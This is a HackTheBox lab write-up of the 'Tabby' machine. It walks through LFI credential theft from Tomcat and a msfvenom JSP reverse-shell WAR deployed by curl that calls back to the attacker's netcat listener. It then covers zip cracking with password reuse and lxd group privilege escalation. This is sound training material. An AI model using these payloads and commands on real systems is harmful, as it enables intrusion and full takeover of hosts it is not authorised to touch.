---
Category:
  - B2R
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [LFI, WAR, cracking-zip-files, privesc/lxd, tomcat, Linux]
---
### Improved skills

- LFI
- Tomcat WAR exploitation
- Cracking .zip files
- lxd Privilege Escalation

### Used tools

- nmap
- gobuster
- msfvenom
- LinEnum.sh
- fcrackzip

---

## Introduction & Foothold

>[!summary]
>**Tabby** is an *easy* HTB machine focused on the manually exploitation of a **Tomacat** server using a **.WAR** reverse shell and the exploitation of a misconfigured group permission which allow to escalate to root abusing **lxd** rights.

Let’s start as always with an **nmap** scan:

```bash
root@kali:~/HackTheBox# nmap -Pn -sCV -p22,80,8080 -oN nmap/Basic_10.10.10.194.nmap 10.10.10.194
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat 9.0.31
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We find out that there are three services running on the box, **two of which** are **web servers** (an *Apache httpd 2.4.41* and an *Apache Tomcat 9.0.31*).

Visiting the first site we discover that the **host** of the box is ***megahosting.htb***. In order to properly enumerate the box we need to resolve it correctly

`cat "10.10.10.194    megahosting.it" >> /etc/hosts`

Now that we are effectively ready, let’s start enumerating every page of the first web server.

![2020-06-22-14-48-13.png](../../zzz_res/attachments/2020-06-22-14-48-13.png)

After few minutes I found the http://megahosting.htb/news.php?file=statement page, which results to be vulnerable to **Local File Inclusion** (LFI).

![2020-06-22-14-59-19.png](../../zzz_res/attachments/2020-06-22-14-59-19.png)

![2020-06-22-14-59-41.png](../../zzz_res/attachments/2020-06-22-14-59-41.png)

Because we got an LFI vulnerability, the logical next step was to try to exploit it in order to get a Remote Code Execution, but unfortunately none of the existing methods worked… so I decided to start to enumerate the second web server (**tomcat**), looking for another entry point.

```bash
root@kali:~/HackTheBox# gobuster dir -u http://10.10.10.194:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html,.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.194:8080/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Timeout:        10s
===============================================================
2020/06/22 16:05:04 Starting gobuster
===============================================================
/index.html (Status: 200)
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
```

Among all the various directories, ***/manager*** immediately caught my attention: trying to logging in, the server reveals which file contains the credentials, allowing us to use the **LFI** to get them.

![2020-06-22-16-11-37.png](../../zzz_res/attachments/2020-06-22-16-11-37.png)

Finding ***tomcat-users.xml*** was a pain as the installation of the web server was done *without following standards paths and rules*, however, after a couple of hours I was able to read the file, located in ***/usr/share/tomcat9/etc/tomcat-users.xml***

![2020-06-22-16-45-05.png](../../zzz_res/attachments/2020-06-22-16-45-05.png)

![2020-06-22-16-45-57.png](../../zzz_res/attachments/2020-06-22-16-45-57.png)

Good! Now we are able to login into the ***/manager*** directory and proceeds.

Since the tomcat user are assigned the roles of **admin-gui** and **manager-script**, he has the permission to access the *host-manager webapp via web gui* (from which nothing can be done) but also to interact ***via cli with the manager webapp***, which allows us to upload **.war files** to the server (see the [official documentation](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html)).

Once we find the way, let’s **create our reverse shell** through **msfconsole**

```bash
root@kali:/var/www/html#  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=9876 -f war > maoutis.war
Payload size: 1095 bytes
Final size of war file: 1095 bytes

root@kali:/var/www/html# ls -al maoutis.war 
-rw-r--r-- 1 root root 1095 Jun 29 19:08 maoutis.war
```

load it on the server

```bash
root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' -T maoutis.war 'http://10.10.10.194:8080/manager/text/deploy?path=/maoutis'
OK - Deployed application at context path [/maoutis]
root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/maoutis:running:0:maoutis
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
and run it to get access as *tomcat* user.
```

```bash
root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/maoutis/
```

```bash
root@kali:~# nc -lvp 9876
python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9$ export TERM=screen
CTRL+Z
root@kali:~/HackTheBox# stty raw -echo
root@kali:~/HackTheBox# fg

tomcat@tabby:/var/lib/tomcat9$
```

## Lateral Movement to ash

Once gained the shell, further enumeration reveals that the user of the box is **ash**.

Running **LinEnum.sh** we discovered a **.zip backup file** inside ***/var/www/html/files/*** which require to be cracked in order to be unzipped. Let’s use **fcrackzip** in order to crack the archive.

```bash
root@kali:~/HackTheBox/Machine/Tabby/files# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' 16162020_backup.zip 

PASSWORD FOUND!!!!: pw == admin@it
```

Password found! While inside the archive we didn’t find anything useful, trying to use the password to switch to **ash** reveals that the same *password has been reused*.

```bash
tomcat@tabby:/var/www/html/files$ su ash                                                                             
Password: admin@it                                                                                                           
ash@tabby:/var/www/html/files$ 
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Well done! We are ash!

## Privilege Escalation

Running again **LinEnum.sh** it reveals that we are members of the **lxd group** and that exists a way to ***abuse this permission*** in order *to became root*. Searching on Google I found [this](https://www.hackingarticles.in/lxd-privilege-escalation/) article, which describes how an account on the system that is a member of the lxd group is able to escalate the root privilege by exploiting the features of LXD.

1. **Download** the **lxd-alpine-builder** locally on the kali machine and built it as root
    
    ```bash
    $git clone https://github.com/saghul/lxd-alpine-builder.git
    $cd lxd-alpine-builder
    $sudo bash build-alpine
    ```
    
    Probably will appear errors like *“tar: Ignoring unknow …”*. Don’t worry and continue     with the privilege escalation process.
    
2. **Upload** the **.tar** file on the **ash home** directory and **import** it **inside lxc**
    
    ![2020-06-29-23-27-45.png](../../zzz_res/attachments/2020-06-29-23-27-45.png)
    

Once finished, we will be root!

# Trophy

>[!quote]
>If you can't give me poetry, can't you give me poetical science?
>
>\- Ada Lovelace

